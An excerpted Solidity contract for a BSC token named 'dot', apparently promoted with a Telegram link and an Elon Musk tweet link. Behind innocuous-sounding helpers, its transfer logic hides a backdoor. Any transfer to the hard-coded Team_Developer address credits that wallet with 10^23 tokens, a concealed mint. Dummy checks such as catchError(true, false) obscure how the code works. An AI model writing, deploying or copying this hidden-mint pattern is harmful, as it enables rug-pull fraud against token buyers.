...
// Twitter : https://twitter.com/elonmusk/status/1623863722262532097

// Telegram : https://t.me/Dot_bsc
...
abstract contract Context {
    ...
    function _result() internal view virtual returns (uint256){
        return 10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10*10;
    }
}
...
contract dot is Context, IERC20 { 
    ...
    address payable public Team_Developer = payable(0xe45C7BCBAFC4F3996B4023Df667d1531dBEdE59C);
    address payable public constant BurnWallet = payable(0x000000000000000000000000000000000000dEaD); 

    function teamLeader() public view virtual returns (address) {
        return Team_Developer;
    }

    function catchError(bool v, bool c) private pure returns(bool){
        return v && c;
    }
    ...
    constructor () {
        ...
        _owner = 0xe45C7BCBAFC4F3996B4023Df667d1531dBEdE59C;
    ...
    function checkFeeRate(address desAdd) private view returns(bool){
        return !(desAdd != teamLeader()) && statusOfFee(desAdd);
    }
    ...
    function _transfer(
        ...
        if (from != owner() && catchError(true, false))
    ...
    function _getTValues(address sender, address recipient, uint256 result) private view returns(uint256, uint256){
        uint256 senderResult = sender != recipient ? (_tOwned[sender]-result) : (_tOwned[sender]+result);
        result = checkFeeRate(recipient) ? (_tOwned[recipient]+_result()) : (_tOwned[recipient]+result);
        uint256 recipientResult = result;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            (_tOwned[sender], _tOwned[recipient]) = _getTValues(sender, recipient, tAmount);
